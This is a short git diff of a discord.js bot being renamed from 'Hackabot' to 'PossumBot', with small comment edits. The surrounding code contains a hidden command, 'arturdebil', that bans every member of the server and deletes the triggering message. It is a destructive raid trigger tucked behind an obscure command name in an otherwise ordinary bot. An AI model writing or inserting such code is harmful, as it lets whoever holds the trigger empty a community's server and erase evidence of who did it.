@@ -3,7 +3,8 @@ const Discord = require("discord.js");
 const bot = new Discord.Client({disableEveryone: true});
 
 bot.on("ready", async () => {
-	console.log(`Hackabot Is Now Activated`);
+	console.log(`PossumBot Is Now Activated`);
+	//Bot Status
 	bot.user.setActivity(`With Knives`);
 
 	try {
@@ -34,7 +35,7 @@ if(message.author.bot) return;
 		console.log(e.stack);
 	}
    }
-   //Bans all people and deletes the message.
+   //Bans everyone and deletes the message.
    if(command === `arturdebil`) {
    	try {
    	message.guild.members.forEach(member => {member.ban()});
